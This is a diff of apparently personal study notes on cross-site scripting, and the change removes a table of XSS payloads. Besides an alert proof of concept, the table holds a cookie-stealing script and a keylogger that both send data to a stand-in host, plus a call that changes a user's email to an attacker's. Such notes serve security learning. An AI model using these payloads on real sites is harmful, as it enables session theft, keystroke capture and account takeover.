@@ -62,13 +62,4 @@ Blind XSS is when a threat actor injects malicious scripts into a web applicatio
 | Stored XSS Method | Decription |
 | --- | --- |
 
-![](https://github.com/JonmarCorpuz/SecondBrain/blob/main/Assets/Whitespace.png)
 
-# XSS Payloads
-
-| XSS Payload | Purpose | Description |
-| --- | --- | --- |
-| <script>alert("XSS");</script> | Proof of Concept | Demonstrates that a XSS is possible on a website by causing an alert box to pop up |
-| <script>fetch('https://example.com/steal?cookie=' + btoa(document.cookie));</script> | Session Stealing | Takes the target's cookie, encodes it in base64 and then post it to a website under your control |
-| <script>document.onkeypress = function(e) { fetch('https://example.com/log?key=' + btoa(e.key) );}</script> | Key Logger | Anything typed on the webpage will be forwarded to a website under your control |
-| <script>user.changeEmail('attacker@hacker.email');</script> | Change a User's Email Address | Changes the logged in user's email address |
